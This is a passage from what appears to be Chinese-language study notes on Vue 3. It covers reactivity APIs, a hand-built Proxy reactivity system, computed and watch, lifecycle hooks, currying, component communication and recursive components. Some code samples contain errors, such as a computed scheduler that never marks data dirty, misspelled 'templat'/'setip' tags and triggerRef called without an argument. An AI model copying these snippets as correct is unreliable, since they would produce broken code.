= &#123; name:string &#125; // 直接使用ref const Man = ref&lt;M&gt;(&#123; name: &#x27;Ender&#x27; &#125;) // 使用Ref接口 const Man:Ref&lt;M&gt; = ref(&#123; name: &#x27;Ender&#x27; &#125;) const Man2 = &#123; name: &#x27;Ender3&#x27; &#125; const Man3 = shallowRef(&#123; name: &#x27;Ender4&#x27; &#125;) const customRefMan = MyRef&lt;string&gt;(&#x27;customEnder&#x27;) const change = () =&gt; &#123; // 修改和取值时需要通过value访问其中的值 Man.value.name = &#x27;Ender2&#x27; // shallowRef使用这样的方式修改视图将不会同步改变 Man2.value.name = &#x27;Ender2&#x27; // 但此处仍然会发生改变，因为收到了ref的影响 // shallowRef需要使用这样的方式修改 Man2.value = &#123; name: &quot;Ender2&quot; &#125; // 但如果调用了triggerRef,即使是shallowRef也一样会被更新 triggerRef() // 自定义Ref同样通过value的方式进行值修改 customRefMan.value = &#x27;customEnder修改了&#x27; console.log(isRef(Man2)) console.log(Man) console.log(Man) &#125;&lt;/script&gt; reactive全家桶 与ref一样，目的是将变量变为响应式对象，但和ref还是有区别的： ref支持所有类型，但reactive只支持引用类型（Array， Object，Map，Set）（reactive同样支持传递泛型 reactive取值和赋值不需要使用.value进行访问，直接使用赋值语句进行修改即可 但需要注意的是reactive对象不能直接赋值，原因是reactive对象是由proxy代理的，直接赋值将破坏响应式对象 readonly用来创建一个reactive对象的只读视图： 12let obj = reactive(&#123;name:&#x27;Ender&#x27;&#125;)const read = readonly(obj) 其中read对象的属性是无法进行赋值操作的，但read对象会随着obj对象的改变而改变 shallowReactive用于创建一个浅层响应式对象，与reactive的区别参考shallowRef和ref的区别: shallowReactive的响应式只会添加到对象的第一层属性，即shallowObj.attr，之后层级的属性没有响应式，例如shallowObj.attr.attr2 同样的当shallowReactive和reactive的域相同时，也会受到reactive的影响而发生改变 to全家桶 toRef 接收两个参数(obj, key) 其中obj为一个响应式对象（传入非响应式对象将不会产生影响） 原因是使用ref或reactive创建的响应式对象中的get和set方法会调用track收集依赖和trigar更新依赖 因此在toRef返回的响应式对象中并没有做这两个操作，目的是防止传入响应式对象时收集和更新了两次 所以非响应式对象即使传入toRef函数，返回的对象中也并不会调用收集和更新函数 key为一个属性key 作用是可以让响应式obj中的某个属性变为响应式 使用场景为： 将对象中的某个属性包装为一个响应式对象提供给外部使用，而不暴露整个对象 有时需要将响应式对象中的某些属性解构出来传递给某个函数，由于解构操作使得属性失去响应式，此时需要使用它将这些属性变为响应式的 toRefs 指定了泛型为Object 接收一个Object类型的参数 即将这个对象中的所有属性均调用toRef变为响应式属性后，将整个新对象返回 使用场景： 需要对整个对象进行解构取值时 let &#123; name, age, like &#125; = toRefs(obj)此时name、age、like均为响应式 如果此处不调用toRefs函数，得到的变量将不是响应式的，即修改将不会被更新 toRaw 接收一个Object类型的参数 将传入的响应式Object转化为普通对象，即取消响应式 源码中就是返回了响应式对象中的__v_raw属性的值 Vue3响应式原理 Vue2中使用Object.defineProperty实现响应式 Vue3中则使用Proxy来实现 vue2的不足 Vue2中的方法只能劫持设置好的数据，新增的数据需要使用Vue.set() 数组只能操作种方式，修改某一项值无法劫持 下面是Vue3的响应式实现： effect.ts用于处理数据绑定 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// TODO: effect函数用于处理DOM渲染与数据的绑定// TODO：effect函数接收一个用于DOM渲染的函数// TODO: 定义一个全局变量来存储effect,便于函数外进行收集// TODO: 定义一个脏数据标记方法interface Options &#123; schedule?: Function&#125;let activeEffect;export const effect = (fn:Function, option: Options) =&gt; &#123; const _effect = function() &#123; // TODO: 将fn的作用域提升使得外界可以访问 activeEffect = _effect // TODO: 渲染DOM let res = fn() return res &#125; // 在effect中记录是否需要清除脏数据标记位的操作 _effect.options = option _effect() // TODO: 将函数返回用于在Computed对象中渲染 return _effect&#125;// TODO: 实现track收集依赖// TODO：接收一个对象以及对象中的一个属性值// TODO: 一个全局的Map用于构建Object到Map的映射const targetMap = new WeakMap()export const track = (target, key) =&gt; &#123; // TODO: 取出target对象所对应的属性列表 let depsMap = targetMap.get(target) if(!depsMap) &#123; // TODO: 第一次调用如果没有则添加 depsMap = new Map() targetMap.set(target, depsMap) &#125; // TODO: 如果有则将其中的key属性名对应的effect函数set取出 let deps = depsMap.get(key) if(!deps) &#123; // 如果没有就添加 deps = new Set() depsMap.set(key, deps) &#125; // TODO: 如果有则将effect函数加入到deps中,收集结束 deps.add(activeEffect)&#125;// TODO: 实现trigger触发更新函数// TODO: 接收一个对象以及对象中的一个属性值export const trigger = (target, key) =&gt; &#123; // TODO: 根据对象找到属性MAP let depsMap = targetMap.get(target) // TODO: 没有则报错 if(!depsMap) &#123; console.error(&quot;target is not a effect object&quot;) return &#125; // TODO: 存在则取出key对应的effect函数SET let deps = depsMap.get(key) // TODO: 如果没有则报错 if(!deps) &#123; console.error(&quot;target.key is not a effect value&quot;) return &#125; // TODO: 存在则重新调用其中的所有effect函数 deps.forEach( effect =&gt; &#123; // TODO: 在触发更新时判断这一步更新是否有数据因此变为脏数据，有则重置其脏数据标记位 if(effect?.options?.schedule) &#123; effect?.options?.schedule?.() &#125; else &#123; effect() &#125; &#125;)&#125; reactive.ts用于处理响应式对象 1234567891011121314151617181920212223242526272829303132333435// TODO: 引入收集和触发机制import &#123; track, trigger &#125; from &quot;./effect&quot;// TODO: 一个用于判断属性是否为对象的函数const isObject = (target:any) =&gt; &#123; return target!=null &amp;&amp; typeof target == &#x27;object&#x27;&#125;// TODO: reactive实现// TODO: reactive创建一个函数，接收一个对象，并使用泛型限制参数为对象export const reactive = &lt;T extends object&gt;(target:T) =&gt; &#123; // TODO: 创建一个proxy对象来代理原有对象 return new Proxy(target, &#123; // TODO: 拦截get get(target, propKey, receiver) &#123; // TODO: 返回对象中的参数,此处使用Reflect中的参数来保证上下文的正确性 let res = Reflect.get(target, propKey, receiver) as object // TODO: 访问对象属性 后 需要进行资源回收 track(target, propKey) // TODO: 如果属性是对象，怎需要递归创建 if(isObject(res)) &#123; return reactive(res) &#125; return res &#125;, set(target, propKey, value, receiver) &#123; // TODO: 对对象属性进行设置,此处使用Reflect中的参数来保证上下文的正确性 let res:boolean = Reflect.set(target, propKey, value, receiver) // TODO: 设置对象属性 后 需要进行依赖更新 trigger(target, propKey) return res &#125; &#125;)&#125; computed.ts用于实现计算属性 12345678910111213141516171819202122232425262728293031import &#123; effect &#125; from &quot;./effect&quot;// TODO: 实现计算属性，接收一个getter函数export const computed = (getter:Function) =&gt; &#123; // TODO: 记录getter方法的响应式函数 let _value = effect(getter, &#123; schedule: () =&gt; &#123; // TODO: 回调函数中将数据标记为脏数据 _dirty = false &#125; &#125;) // TODO: 设置缓存机制 let _dirty = true let cacheValue class ComputedRefImpl &#123; // TODO: 拦截计算属性的访问属性请求 get value() &#123; // TODO: 如果为脏数据，则重新计算结果并更新缓存 if(_dirty) &#123; cacheValue = _value() _dirty = false &#125; // TODO: 如果不为脏数据，则直接返回缓存结果 return cacheValue &#125; &#125; // TODO: 返回 return new ComputedRefImpl&#125; index.html 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;script type=&quot;module&quot;&gt; import &#123; reactive &#125; from &#x27;./reactive.ts&#x27; import &#123; effect &#125; from &quot;./effect.ts&quot; import &#123; computed &#125; from &quot;./computed.ts&quot; const user = reactive(&#123; name: &quot;Ender&quot;, age: &quot;23&quot;, foo: &#123; bar: &#123; sss: 123 &#125; &#125; &#125;) effect(() =&gt; &#123; document.querySelector(&#x27;#app&#x27;).innerText = `$&#123;user.name&#125; -- $&#123;user.age&#125; -- $&#123;user.foo.bar.sss&#125;` &#125;) window.a = reactive(&#123; name: &#x27;a&#x27;, age: 18 &#125;) // 计算属性 window.b = computed(() =&gt; &#123; console.log(&#x27;重新计算&#x27;) return a.age + 10 &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; computed计算属性 计算属性即当依赖发生改变时，就会触发他的更新，如果依赖值不变，则使用缓存中的属性值 12345678910111213141516171819202122232425262728293031323334353637383940&lt;template&gt; &lt;div&gt; &lt;div&gt; 姓：&lt;input v-model=&quot;firstName&quot; type=&quot;text&quot;&gt; &lt;/div&gt; &lt;div&gt; 名：&lt;input v-model=&quot;lastName&quot; type=&quot;text&quot;&gt; &lt;/div&gt; &lt;div&gt; 全名: &#123;&#123; name &#125;&#125; &lt;/div&gt; &lt;button @click=&quot;changeName&quot;&gt; changeName &lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&#x27;ts&#x27;&gt; import &#123; ref, computed &#125; from &#x27;vue&#x27; let firstName = ref(&#x27;张&#x27;) let lastName = ref(&#x27;三&#x27;) // 1. 选项式写法 支持一个对象传入get、set方法 // name会随着firstName和lastName的变化而变化 let name = computed&lt;String&gt;(&#123; get () &#123; return firstName.value + &#x27;-&#x27; + lastName.value &#125;, set (newVal) &#123; // 将得到的值解构赋值给firstName和lastName [firstName.value, lastName.value] = newVal.split(&#x27;-&#x27;) &#125; &#125;) const changeName = () =&gt; &#123; // name变量可以直接赋值，赋值时会被computed中的set拦截 name.value = &#x27;Ender-Xiao&#x27; &#125; // 函数写法 只能支持一个gat函数，不允许修改 // 使用computed创建的对象是readonly的 let name = computed(()=&gt; firstName.value + &#x27;-&#x27; + lastName.value) &lt;/script&gt; 注意： 需要注意的是使用computed函数创建的计算属性是readonly的，无法进行修改 watch监听器 watch(obj, (newVal, oldVal) =&gt; &#123;&#125;, &#123;deep:true&#125;) obj为一个响应式对象 第二个参数接收一个回调函数，当obj发生变化时调用该函数 其中newVal为改变后的值，oldVal为改变前的值 obj可以传入一个响应式对象数组，此时将会监听数组中的每一个对象的变化 并且此时的newVal和oldVal都将变为数组 第三个参接收一个对象options，其中包含一些可选项 deep 当obj为一个嵌套多层的对象且，为ref对象时，需要在options中将深度监听deep开启 如果obj是一个reactive对象，那么则不需要开启deep 但处理引用对象时，newVal和oldVal中的值将会相同 immediate 默认为false 为true时立即调用传入的第二个参数回调函数 flash 默认为&quot;pre&quot;，表示组件更新之前执行回调 &quot;sync&quot;表示与组件更新同步执行回调 &quot;post&quot;表示组件更新之后执行回调 当需要监听响应式对象中的某一个属性时则需要使用get函数的形式传递： watch(()=&gt;obj.attr1.attr2.name, (newVal, oldVal)=&gt;&#123;&#125;) 此时newVal为新值，oldVal为旧值 watchEffect高级监听器 const stop = watchEffect((oninvailidate)=&gt;&#123;oninvailidate(() =&gt; &#123;console.log(&quot;before&quot;)&#125;)console.log(message.value)&#125;, &#123;&#125;) 该函数接收一个回调函数 该回调函数中直接使用某一变量，那么该变量值的改变就将会被监听 回调函数接收一个oninvailidate函数 该回调函数接收另一个回调函数 在这个回调函数中的代码将始终在其监听的变量值发生变化之前运行 接收一个option对象 flash 默认为&quot;pre&quot;，表示组件更新之前执行回调 &quot;sync&quot;表示与组件更新同步执行回调 &quot;post&quot;表示组件更新之后执行回调 onTrigger onTrigger(e)&#123;debugger&#125;可以提供调试时使用 组件与生命周期 Vue3与2的区别在于，Vue3中在setup中引用组件后无需注册 而Vue3组件的生命周期区别在于Vue3的setup中的组件没有beforeCreate和created两个生命周期，而使用setup代替 Vue3组件生命周期： setup代码块外面的部分 onBeforeMount获取不到DOM onMounted能获取到DOM onBeforeUpdate获取更新前的DOM onUpdated获取更新后的DOM onBeforeUnmount onUnmounte onRenderTracked((e)=&gt;&#123;&#125;)在依赖收集完成后触发，即访问响应式对象的属性时obj.attr onRenderTriggered((e) =&gt; &#123;&#125;)在触发更新时触发，即修改响应式对象的属性时obj.attr=value 开发时可以使用const instance = getCurrentInstance()来获取当前组件的window对象，而生命周期函数实际上就是挂载到window对象上的函数，因此可以通过这种方式来检测生命周期函数是否挂载上 函数柯里化 生命周期函数的实现使用了函数柯里化技术，因为生命函数创建时都由createHook方法创建，并由名称区别，而其他的参数在同一项目中始终保持不变，因此需要进行函数柯里化来保存部分参数，而这一技术实际上就是使用了函数闭包的特性将函数和其外部变量一起保存： 柯里化（Currying）又称部分求值，一个柯里化的函数首先会接收一些参数，接收了这些参数后，该函数并不会立即求值，而是继续返回另外一个函数，刚才传入的参数在函数形成的闭包中被保存起来。待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值。 简单来说就是：柯里化是一种函数的转换，它是指将一个函数从可调用的 f(a, b, c) 转换为可调用的 f(a)(b)©或者f(a, b)©或者f(a)(b, c) 例如下面这个日志函数： 1234567// 参数：date, project, messageconst log = (date, project, message) =&gt; &#123; return `$&#123;date&#125; $&#123;project&#125; $&#123;message&#125;`&#125;const logMsg = log(&#x27;2022-07-29&#x27;, &#x27;xxx后台管理系统&#x27;, &#x27;mm接口异常&#x27;);console.log(logMsg) // 输出 2022-07-29 xxx后台管理系统 mm接口异常 但通常当天日期是不变的，同一个项目的项目名也是不变的（不过不同的项目名是变化的），唯有信息是时刻变化 如果每次都把所有参数全部传入进去会有很多重复 因此可以对它进行柯里化： 123456789101112131415161718192021222324252627282930313233343536373839const log = (date) =&gt; &#123; return (projectName) =&gt; &#123; return (message) =&gt; &#123; return `$&#123;date&#125; $&#123;projectName&#125; $&#123;message&#125;` &#125; &#125;&#125;/* 如果日期、项目名、信息都不同的情况下输出日志 */// 日期为“2022-07-29”，项目名为“A项目”，输出日志const logMsg1 = log(&#x27;2022-07-29&#x27;)(&#x27;A项目&#x27;)(&#x27;接口报错&#x27;);console.log(logMsg1); // 打印 2022-07-29 A项目 接口报错// 日期为“2022-07-29”，项目名为“A项目”，输出日志const logMsg2 = log(&#x27;2022-08-01&#x27;)(&#x27;B项目&#x27;)(&#x27;接口成功&#x27;);console.log(logMsg2); // 打印 2022-08-01 B项目 接口成功/* 如果日期相同，项目名、信息不同的情况下输出日志 */const sameDateLog = log(&#x27;2022-07-29&#x27;);// 项目名为“A项目”，输出日志const logMsg3 = sameDateLog(&#x27;A项目&#x27;)(&#x27;接口异常&#x27;);console.log(logMsg3); // 打印 2022-07-29 B项目 接口异常// 项目名为“B项目”，输出日志const logMsg4 = sameDateLog(&#x27;B项目&#x27;)(&#x27;接口超时&#x27;);console.log(logMsg4); // 打印 2022-07-29 B项目 接口超时/* 如果日期、项目名相同，信息不同的情况下输出日志 */const sameDateProjectNameLog = log(&#x27;2022-07-29&#x27;)(&#x27;A项目&#x27;);// 输出日志const logMsg5 = sameDateProjectNameLog(&#x27;网络异常&#x27;)console.log(logMsg5); // 打印 2022-07-29 A项目 网络异常 可以利用递归来封装一个把任意函数变为柯里化函数的函数： 1234567891011121314151617181920212223242526272829303132333435// 函数柯里化，利用递归和闭包实现const curry = function(fn) &#123; const len = fn.length; // 获取初始函数fn的形参个数 // curry返回改造后的函数 return function t() &#123; const innerLength = arguments.length; // 获取t的实参个数 const args = Array.prototype.slice.call(arguments); // 将类数组arguments对象转为真正的数组（类数组arguments对象是函数传入的实际参数，类似数组，拥有数组属性，但不是数组） if (innerLength &gt;= len) &#123; // 递归出口，如果t实参个数已经大于fn形参个数,则终止递归 return fn.apply(undefined, args) // 执行改造后的函数 &#125; else &#123; // 如果t的实参个数少于fn的形参个数，说明柯里化并没有完成，则继续执行柯里化 return function () &#123; const innerArgs = Array.prototype.slice.call(arguments); // 将类数组arguments对象转为真正的数组（类数组arguments对象是函数传入的实际参数，类似数组，拥有数组属性，但不是数组） const allArgs = args.concat(innerArgs); return t.apply(undefined, allArgs) &#125; &#125; &#125;&#125;// 测试function add (num1, num2, num3, num4, num5) &#123; return num1 + num2 + num3 + num4 + num5;&#125;const finalFun = curry(add);const result1 = finalFun(1)(2)(3)(4)(5);const result2 = finalFun(1, 2)(3)(4)(5);const result3 = finalFun(1,2,3)(4)(5);const result4 = finalFun(1,2,3)(4, 5);console.log(result1, result2, result3, result4); // 15 15 15 15 柯里化经典面试题 请实现一个add函数实现以下功能 ： 1234567add(1) // 1add(1)(2) // 3add(1)(2)(3) // 6add(1)(2)(3)(4) // 10add(1)(2,3) // 6add(1,2)(3) // 6add(1,2,3) // 6 函数柯里化应用场景 参数复用：即如果函数有重复使用到的参数，可以利用柯里化，将复用的参数存储起来，不需要每次都传相同的参数 延迟执行：传入参数个数没有满足原函数入参个数，都不会立即返回结果，而是返回一个函数。（bind方法就是柯里化的一个示例） 函数式编程中，作为compose, functor, monad 等实现的基础 优点： 柯里化之后，我们没有丢失任何参数：log 依然可以被正常调用。 我们可以轻松地生成偏函数，例如用于生成今天的日志的偏函数。 入口单一。 易于测试和复用。 缺点： 函数嵌套多 占内存，有可能导致内存泄漏（因为本质是配合闭包实现的） 效率差（因为使用递归） 变量存取慢，访问性很差（因为使用了arguments） 组件间通信 父传子props vue3中使用props传值 父组件通过v-bind(:)将要传递的参数进行绑定 1234&lt;!-- template --&gt;&lt;waterFallVue :title=&quot;name&quot;&gt;&lt;/waterFallVue&gt;&lt;!-- script --&gt;let name=&quot;ender&quot; 而子组件中如果处于setup模式下，则需要使用defineProps()宏来声明，其中声明的变量是可以直接在模板中使用的，但在宏外的js作用域内，需要通过其返回值props来访问 123456789101112131415&lt;template&gt; &lt;div&gt; &#123;&#123; title &#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;!-- script setup --&gt;&lt;script setup lang=&quot;ts&quot;&gt; const props = defineProps(&#123; title: &#123; type: String, default: &quot;默认值&quot; &#125; &#125;) console.log(props.title)&lt;/script&gt; 在非setup模式下，则需要在setup中接收props参数： 1234567891011&lt;script&gt;export default &#123; props: &#123; title: String &#125;, setup(props) &#123; // setup() 接收 props 作为第一个参数 console.log(props.title) &#125;&#125;&lt;/script&gt; TS泛型 值得一提的是，结合TS泛型机制，可以更方便，更整体化的去声明参数： 1234567891011121314const props = defineProps&lt;&#123; title: String&#125;&gt;()console.log(props.title)//TS 定义默认值需要使用withDefaults，该函数第二个参数接收一个对象来定义默认值const props = withDefaults(defineProps&lt;&#123; title: String, arr: number[]&#125;&gt;(), &#123; // 引用数据类型需要通过函数防止引用 arr:()=&gt;[6] title: &quot;默认值&quot;&#125;) 子传父 emit自定义事件方式 子组件声明自定义事件 在自定义事件中访问子组件自己的变量 父组件将自己的函数fun以回调函数的方式传递给子组件的事件 子组件将需要传递的数据data作为回调函数的参数，调用回调函数fun 父组件即可在函数fun中接收到子组件的值 子组件 1234567891011121314const emit = defineEmits([&#x27;on-trans-data&#x27;])const transData = &quot;我是被传递的参数&quot;const send = () =&gt; &#123; emit(&#x27;on-trans-data&#x27;, transData)&#125;// ts中的泛型写法如下const emit = defineEmits&lt;&#123; (e:&quot;on-trans-data&quot;,name:string):void&#125;&gt;()const transData = &quot;我是被传递的参数&quot;const send = () =&gt; &#123; emit(&#x27;on-trans-data&#x27;, transData)&#125; 父组件 12345678910&lt;template&gt; &lt;waterFallVue @on-trans-data=&quot;getData&quot;&gt;&lt;/waterFallVue&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; const getData = (data:String) =&gt; &#123; // data为子组件中的数据 console.log(data) &#125;&lt;/script&gt; defiineExpose方法暴露方法or属性 子组件 1234defineExpose(&#123; data: &quot;Hello&quot;, open: () =&gt; console.log(1)&#125;) 而父组件则要使用ref来获取暴露的数据 12345678910111213&lt;template&gt; &lt;waterFallVue ref=&quot;waterFall&quot;&gt;&lt;/waterFallVue&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import waterFallVue from &#x27;./components/water-fall.vue&#x27; import &#123; onMounted &#125; from &#x27;vue&#x27; onMounted(()=&gt;&#123; // 此处需要利用TS的InstanceType来推断类型 const waterFall = ref&lt;InstanceType&lt;typeof waterFallVue&gt;&gt;() console.log(waterFall.value.data) &#125;)&lt;/script&gt; 使用defineProps实现瀑布流组件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;template&gt; &lt;div id=&quot;waterFall&quot; class=&quot;ender-waterfall&quot;&gt; &lt;div :style=&quot;&#123;height: item.height + &#x27;px&#x27;, background: item.background, left: item.left + &#x27;px&#x27;,top: item.top + &#x27;px&#x27;&#125;&quot; v-for=&quot;(item, index) in waterFallList&quot; :key=&quot;index&quot; class=&quot;ender-waterfall__items&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref, reactive, onMounted &#125; from &#x27;vue&#x27;// TODO: 接收父组件传来的数据const props = withDefaults(defineProps&lt;&#123; list: any[]&#125;&gt;(),&#123; list: ()=&gt;[&#123;height: 300, background: &#x27;red&#x27;&#125;]&#125;)// TODO: 维护需要渲染的元素const waterFallList = reactive&lt;any[]&gt;([])// TODO: 维护高度const heightList:number[] = []//TODO: 初始化父组件传来的参数const init = () =&gt; &#123; // TODO: 清空数据 waterFallList.length = 0 heightList.length = 0 const width = 130 // TODO: 获取可是区域的宽度 const x = document.getElementById(&quot;waterFall&quot;)?.clientWidth const column =Math.floor(x===undefined? 0: x / width) console.log(column) // TODO: 根据列数从props中拿出第一行 for (let i = 0; i &lt; props.list.length; i++) &#123; if(i&lt;column)&#123; // TODO: 第一列元素按顺序放 props.list[i].left = i * width props.list[i].top = 10 waterFallList.push(props.list[i]) heightList.push(props.list[i].height + 10) &#125;else &#123; // TODO: 之后的元素放在高度最小的列 let minHeightIndex = 0; let minHeight = heightList[0]; heightList.forEach((h, index) =&gt; &#123; if(h &lt; minHeight)&#123; minHeightIndex = index minHeight = h &#125; &#125;) // TODO: 计算top和left props.list[i].left = minHeightIndex * width props.list[i].top = minHeight + 10 // TODO: 更新需要渲染的元素 waterFallList.push(props.list[i]) // TODO: 更新高度 heightList[minHeightIndex] = minHeight + props.list[i].height + 10 &#125; &#125;&#125;const resizeHandler = () =&gt; &#123; init()&#125;onMounted(()=&gt;&#123; init() // TODO: 监听窗口大小改变事件 // 防抖函数 const debounce = (fn:Function, delay:number) =&gt; &#123; let timer:any = null return function() &#123; if(timer) &#123; clearTimeout(timer) &#125; timer = setTimeout(()=&gt;&#123; fn() &#125;, delay) &#125; &#125; // 触发事件 const cancelDebounce = debounce(resizeHandler, 100) window.addEventListener(&quot;resize&quot;, cancelDebounce)&#125;)&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt;@include b(waterfall)&#123; position: relative; width: 100%; @include e(items)&#123; position: absolute; width: 120px; &#125;&#125;&lt;/style&gt; 兄弟传参 兄弟间传参有两种方式： 父组件介入 事件总线BUS 父组件介入传参理解起来相对容易，但写起来很复杂： 父组件使用emit为子A派发事件 子A利用父组件派发的事件将数据data传递给父组件 父组件使用props为子B传递数据data 这样组件A就能通过父组件派发的事件修改数据data，组件B也能监听到数据data的变化 父组件介入 父组件： 12345678910111213141516171819&lt;template&gt; &lt;div&gt; &lt;A @trans-data-to-b=&quot;getMessageFromA&quot;&gt;&lt;/A&gt; &lt;B :message=&quot;message&quot;&gt;&lt;/B&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import A from &quot;./A.vue&quot;import B from &quot;./B.vue&quot;import &#123; ref &#125; from &quot;vue&quot;;let message = ref(&quot;&quot;)const getMessageFromA = (params: string) =&gt; &#123; message.value = params&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 子组件A： 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;emitToB&quot;&gt;给B传递一些信息&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;const emit = defineEmits([&#x27;trans-data-to-B&#x27;])let message = &quot;&quot;const emitToB = () =&gt; &#123; message = &quot;来自A的信息&quot; emit(&#x27;trans-data-to-B&#x27;, message)&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 子组件B 12345678910111213141516&lt;template&gt; &lt;div&gt; &#123;&#123; messageFromA &#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;type Props = &#123; messageFromA: string&#125;defineProps&lt;Props&gt;()&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 事件总线BUS 利用发布订阅设计模式设计一个用于事件管理的类： Bus.ts 1234567891011121314151617181920212223242526272829303132333435// TODO: 事件总线接口type BusClass = &#123; emit:(name: string) =&gt; void on:(name: string, callback: Function) =&gt; void&#125;// TODO: 事件名称类型type ParamKey = string | number | symbol// TODO: 将事件名称与回调函数对应type eventList = &#123; [key: ParamKey]: Array&lt;Function&gt;&#125;class Bus implements BusClass &#123; list: eventList constructor() &#123; // 初始化事件列表 this.list = &#123;&#125; &#125; // TODO: 事件调用时，找到事件名称对应的回调函数，分别执行事件名对应的所有回调函数 emit(name:string, ...args:Array&lt;any&gt;) &#123; let eventList: Array&lt;Function&gt; = this.list[name] eventList.forEach(fn =&gt; &#123; fn.apply(this, ...args) &#125;) &#125; // TODO: 将事件名与回调函数相对应，即事件的实际处理操作 on(name:string, callback:Function) &#123; let eventList:Array&lt;Function&gt; = this.list[name] || [] eventList.push(callback) this.list[name] = eventList &#125;&#125;export default new Bus() 子组件A（A.vue） 1234567891011121314151617&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;emitToB&quot;&gt;给B传递一些信息&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import Bus from &quot;../../Bus&quot;let message = &quot;&quot;const emitToB = () =&gt; &#123; message = &quot;来自A的信息&quot; // 注册事件 Bus.emit(&#x27;trans-data-to-B&#x27;, message)&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 子组件B（B.vue） 123456789101112131415161718192021&lt;template&gt; &lt;div&gt; &#123;&#123; messageFromA &#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import Bus from &#x27;../../Bus&#x27;;import &#123; ref &#125; from &#x27;vue&#x27;;let messageFromA = ref(&quot;&quot;)Bus.on(&#x27;trans-data-to-B&#x27;, (message:string) =&gt; &#123; messageFromA.value = message&#125;)type Props = &#123; messageFromA: string&#125;defineProps&lt;Props&gt;()&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 全局组件与递归组件 全局组件 定义全局组件需要在main.ts中对组件进行引入完成后即可在项目中的任何组件进行不引入的使用 此外还可以批量注册全局组件： 1234567// 借鉴ElementUI中的全局注册Icon组件import * as ElementPlusIconsVue from &#x27;@element-plus/icons-vue&#x27;const app = createApp(App)for (const [key, component] of Object.entries(ElementPlusIconsVue)) &#123; app.component(key, component)&#125; 递归组件 对于树形结构的数据，我们可能需要使用递归的组件来对其进行渲染，例如如下形式的数据： 12345678910111213141516171819202122232425262728293031type TreeList = &#123; name: string; icon?: string; children?: TreeList[] | [];&#125;;const data = reactive&lt;TreeList[]&gt;([ &#123; name: &quot;no.1&quot;, children: [ &#123; name: &quot;no.1-1&quot;, children: [ &#123; name: &quot;no.1-1-1&quot;, &#125;, ], &#125;, ], &#125;, &#123; name: &quot;no.2&quot;, children: [ &#123; name: &quot;no.2-1&quot;, &#125;, ], &#125;, &#123; name: &quot;no.3&quot;, &#125;,]); 在VUE3中，可以直接使用文件名作为递归组件自己的名称： 12345678910111213141516171819&lt;!-- Tree.vue --&gt;&lt;templat&gt; &lt;div class=&quot;tree&quot; v-for=&quot;item in data&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt; &lt;Tree v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/Tree&gt; &lt;/div&gt;&lt;/templat&gt;&lt;script setip lang=&#x27;ts&#x27;&gt; type TreeList = &#123; name: string; icon?: string; children?: TreeList[] | []; &#125;; type Props&lt;T&gt; = &#123; data?: T[] | []; &#125;; defineProps&lt;Props&lt;TreeList&gt;&gt;();&lt;/script&gt; 此外还可以使用一个额外的script来将组件变为具名组件，然后通过组件名来调用 123456789101112131415161718192021222324252627&lt;!-- Tree.vue --&gt;&lt;templat&gt; &lt;div class=&quot;tree&quot; v-for=&quot;item in data&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt; &lt;!-- 使用name调用组件自身 --&gt; &lt;tree v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/tree&gt; &lt;/div&gt;&lt;/templat&gt;&lt;!-- 定义组件name --&gt;&lt;script lang=&#x27;ts&#x27;&gt; export default &#123; name: &quot;tree&quot; &#125;&lt;/script&gt;&lt;script setip lang=&#x27;ts&#x27;&gt; type TreeList = &#123; name: string; icon?: string; children?: TreeList[] | []; &#125;; type Props&lt;T&gt; = &#123; data?: T[] | []; &#125;; defineProps&lt;Props&lt;TreeList&gt;&gt;();&lt;/script&gt; 第三种方式在Vue3.3之前需要使用插件unplugin-vue-define-options，之后的版本可以直接使用defineOptions编译宏来定义组件的name 123456789101112131415161718192021222324&lt;!-- Tree.vue --&gt;&lt;templat&gt; &lt;div class=&quot;tree&quot; v-for=&quot;item in data&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt; &lt;!-- 使用name调用组件自身 --&gt; &lt;tree v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/tree&gt; &lt;/div&gt;&lt;/templat&gt;&lt;script setip lang=&#x27;ts&#x27;&gt; &lt;!-- 使用defineOptions定义组件name --&gt; defineOptions(&#123; name: &quot;tree&quot; &#125;) type TreeList = &#123; name: string; icon?: string; children?: TreeList[] | []; &#125;; type Props&lt;T&gt; = &#123; data?: T[] | []; &#125;; 